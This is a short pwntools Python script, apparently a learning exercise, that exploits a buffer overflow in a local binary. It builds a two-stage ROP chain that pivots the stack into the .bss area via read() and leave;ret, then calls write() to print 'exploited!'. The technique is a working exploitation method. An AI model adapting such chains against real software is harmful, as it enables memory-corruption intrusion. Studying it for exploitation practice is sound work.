from pwn import *

binfile = './a.out'
elf = ELF(binfile)
context.binary = binfile 
context.terminal = ["tmux", "splitw", "-h"]

gs = '''
b main
c
'''

def start():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

assert(args.OFFSET)

io = start()

# 1st stage: stack pivot
off = b'a' * int(args.OFFSET, 10)
base_stage = elf.bss() + 0x800
plt_read = elf.plt['read']
plt_write = elf.plt['write']

# read(0, base_stage, 200)
rop = ROP(binfile)
rop.raw(pack(rop.rdi.address))
rop.raw(pack(0))
rop.raw(pack(rop.rsi.address))
rop.raw(pack(base_stage))
rop.raw(pack(rop.rdx.address))
rop.raw(pack(200))

rop.raw(pack(plt_read))
rop.raw(pack(rop.rbp.address))
rop.raw(pack(base_stage))
rop.raw(rop.find_gadget(['leave', 'ret']).address)

payload = off + rop.chain()
io.send(pack(len(payload)))
io.send(payload)
io.clean()

# 2nd stage: "exploited!"と表示させてみる
msg = b"exploited!\x00"

# write(1, "exploited!", len("exploited!"))
rop = ROP(binfile)
rop.raw(pack(0))
rop.raw(pack(rop.rdi.address))
rop.raw(pack(1))
rop.raw(pack(rop.rsi.address))
rop.raw(pack(base_stage + 80)) # msgのaddressを固定しておく
rop.raw(pack(rop.rdx.address))
rop.raw(pack(len(msg)))
rop.raw(pack(plt_write))

payload = rop.chain()
payload += b'a' *(80 - len(payload))
payload += msg
payload += b'a' * (200 - len(payload))

io.send(payload)
print(io.recvall())























